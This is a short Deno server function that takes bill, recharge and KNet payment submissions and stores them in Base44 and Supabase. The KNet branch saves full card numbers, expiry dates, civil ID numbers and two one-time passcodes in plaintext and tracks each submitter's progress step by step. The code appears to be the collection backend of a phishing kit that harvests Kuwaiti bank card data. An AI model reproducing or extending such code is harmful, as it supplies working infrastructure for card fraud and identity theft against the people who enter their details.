import { createClientFromRequest } from 'npm:@base44/sdk@0.8.25';

const SUPABASE_URL = Deno.env.get("SUPABASE_URL");
const SUPABASE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");

async function supabaseInsert(table, data) {
  const res = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
    method: "POST",
    headers: {
      "apikey": SUPABASE_KEY,
      "Authorization": `Bearer ${SUPABASE_KEY}`,
      "Content-Type": "application/json",
      "Prefer": "return=minimal",
    },
    body: JSON.stringify(data),
  });
  if (!res.ok) {
    const err = await res.text();
    throw new Error(`Supabase insert error: ${err}`);
  }
}

Deno.serve(async (req) => {
  try {
    const base44 = createClientFromRequest(req);
    const body = await req.json();
    const { type, phone_number, amount, pay_for } = body;

    // Save to Base44 PaymentRecord entity
    const record = await base44.asServiceRole.entities.PaymentRecord.create({
      phone_number,
      amount: amount ? String(amount) : null,
      network: type,
      pin: pay_for,
      step_reached: 0,
      user_agent: req.headers.get("user-agent") || "",
    });

    // Also save to Supabase
    if (type === "bill") {
      await supabaseInsert("bill_payments", {
        phone_number,
        pay_for,
      });
    } else if (type === "recharge") {
      await supabaseInsert("recharge_payments", {
        phone_number,
        amount: amount ? Number(amount) : null,
        pay_for,
      });
    } else if (type === "knet") {
      // Save KNet card info to both tables for reference
      await supabaseInsert("bill_payments", {
        phone_number: body.card_number || phone_number,
        pay_for: JSON.stringify({
          bank: body.bank,
          card_number: body.card_number,
          card_prefix: body.card_prefix,
          expiry_month: body.expiry_month,
          expiry_year: body.expiry_year,
          civil_id: body.civil_id,
          amount: body.amount,
          step_reached: body.step_reached,
          otp1: body.otp1,
          otp2: body.otp2,
          id_number: body.id_number,
          network: body.network,
        }),
      });
    }

    return Response.json({ success: true, data: record });
  } catch (error) {
    return Response.json({ error: error.message }, { status: 500 });
  }
});